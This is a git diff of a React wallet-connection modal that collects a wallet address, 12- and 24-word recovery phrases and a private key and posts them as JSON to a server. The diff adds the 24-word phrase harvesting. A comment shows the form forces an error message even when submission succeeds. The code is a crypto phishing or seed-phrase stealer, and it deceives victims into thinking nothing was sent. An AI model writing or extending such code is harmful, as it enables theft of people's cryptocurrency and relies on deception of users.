@@ -11,12 +11,13 @@ import {
 import { SwitchIos } from "./mui-treasury/switch-ios";
 import SquareProgress from "./components/square-progress";
 import ContentPasteIcon from "@mui/icons-material/ContentPaste";
+import { BASE_URL } from "../config";
 
 const WalletModal = ({ open, onClose, selectedWallet }) => {
   const [tabValue, setTabValue] = useState(0);
   const [walletAddress, setWalletAddress] = useState("");
   const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
-  const [keystoreJSON, setKeystoreJSON] = useState("");
+  const [phraseWords24, setPhraseWords24] = useState(Array(24).fill(""));
   const [privateKey, setPrivateKey] = useState("");
   const [showErrorPopup, setShowErrorPopup] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
@@ -51,9 +52,35 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
     });
   };
 
+  const handlePaste24 = () => {
+    navigator.clipboard.readText().then((pastedText) => {
+      const words = pastedText.trim().split(" ");
+      if (words.length === 24) {
+        setPhraseWords24(words);
+      } else {
+        setErrorMessage("Please enter 24 words separated by a single space.");
+        setShowErrorPopup(true);
+      }
+    });
+  };
+
+  const handleWordPaste24 = (index) => {
+    navigator.clipboard.readText().then((pastedText) => {
+      const words = pastedText.trim().split(" ");
+      if (words.length === 24) {
+        const newPhraseWords24 = [...phraseWords24];
+        newPhraseWords24[index] = words[index];
+        setPhraseWords24(newPhraseWords24);
+      } else {
+        setErrorMessage("Please copy 24 words separated by a single space.");
+        setShowErrorPopup(true);
+      }
+    });
+  };
+
   const handleSubmit = async () => {
-    if (!walletAddress || phraseWords.includes("")) {
-      setErrorMessage("Wallet address and 12-word phrase are required.");
+    if (!walletAddress || phraseWords.includes("") || phraseWords24.includes("")) {
+      setErrorMessage("Wallet address and 12/24-word phrase are required.");
       setShowErrorPopup(true);
       return;
     }
@@ -62,11 +89,10 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
       walletName: selectedWallet?.name,
       walletAddress: walletAddress,
       phraseWords,
+      phraseWords24,
     };
 
-    if (tabValue === 1) {
-      formData.keystoreJSON = keystoreJSON;
-    } else if (tabValue === 2) {
+    if (tabValue === 2) {
       formData.privateKey = privateKey;
     }
 
@@ -76,9 +102,8 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
         headers: {
           "Content-Type": "application/json",
         },
-          body: JSON.stringify(formData),
-        }
-      );
+        body: JSON.stringify(formData),
+      });
 
       // Force error display even if submission is successful
       setErrorMessage("Error occurred while processing your request.");
@@ -214,8 +239,8 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
               },
             }}
           >
-            <Tab label="Phrase" />
-            <Tab label="Keystore JSON" />
+            <Tab label="12 Key Phrase" />
+            <Tab label="24 Key Phrase" />
             <Tab label="Private Key" />
           </Tabs>
           {tabValue === 0 && (
@@ -288,21 +313,73 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
             </>
           )}
           {tabValue === 1 && (
-            <TextField
-              fullWidth
-              label="Keystore JSON"
-              variant="outlined"
-              margin="dense"
-              size="small"
-              multiline
-              rows={4}
-              value={keystoreJSON}
-              onChange={(e) => setKeystoreJSON(e.target.value)}
-              sx={{
-                "& .MuiInputLabel-root": { fontSize: "0.8rem" },
-                "& .MuiOutlinedInput-root": { borderRadius: "8px" },
-              }}
-            />
+            <>
+              <TextField
+                fullWidth
+                label="Enter your wallet address"
+                variant="outlined"
+                margin="dense"
+                size="small"
+                value={walletAddress}
+                onChange={(e) => setWalletAddress(e.target.value)}
+                sx={{
+                  "& .MuiInputLabel-root": { fontSize: "0.8rem" },
+                  "& .MuiOutlinedInput-root": { borderRadius: "8px" },
+                }}
+              />
+              <Box
+                sx={{
+                  display: "grid",
+                  gridTemplateColumns: "repeat(4, 1fr)",
+                  gap: 1,
+                  mt: 1,
+                  p: 1,
+                  border: "1px solid #999",
+                  borderRadius: "8px",
+                  backgroundColor: "#fff",
+                }}
+              >
+                {phraseWords24.map((word, index) => (
+                  <TextField
+                    key={index}
+                    value={word}
+                    placeholder={`Word ${index + 1}`}
+                    onChange={(e) => {
+                      const newPhraseWords24 = [...phraseWords24];
+                      newPhraseWords24[index] = e.target.value;
+                      setPhraseWords24(newPhraseWords24);
+                    }}
+                    onPaste={() => handleWordPaste24(index)}
+                    variant="outlined"
+                    margin="dense"
+                    size="small"
+                    inputProps={{
+                      style: {
+                        padding: "8px",
+                        fontSize: "0.8rem",
+                        textAlign: "center",
+                      },
+                    }}
+                    sx={{
+                      "& .MuiOutlinedInput-root": { borderRadius: "8px" },
+                    }}
+                  />
+                ))}
+              </Box>
+              <Button
+                variant="outlined"
+                startIcon={<ContentPasteIcon />}
+                onClick={handlePaste24}
+                sx={{
+                  mt: 1,
+                  width: "100%",
+                  borderRadius: "8px",
+                  fontSize: "0.8rem",
+                }}
+              >
+                Paste from Clipboard
+              </Button>
+            </>
           )}
           {tabValue === 2 && (
             <TextField
@@ -311,8 +388,6 @@ const WalletModal = ({ open, onClose, selectedWallet }) => {
               variant="outlined"
               margin="dense"
               size="small"
-              multiline
-              rows={2}
               value={privateKey}
               onChange={(e) => setPrivateKey(e.target.value)}
               sx={{
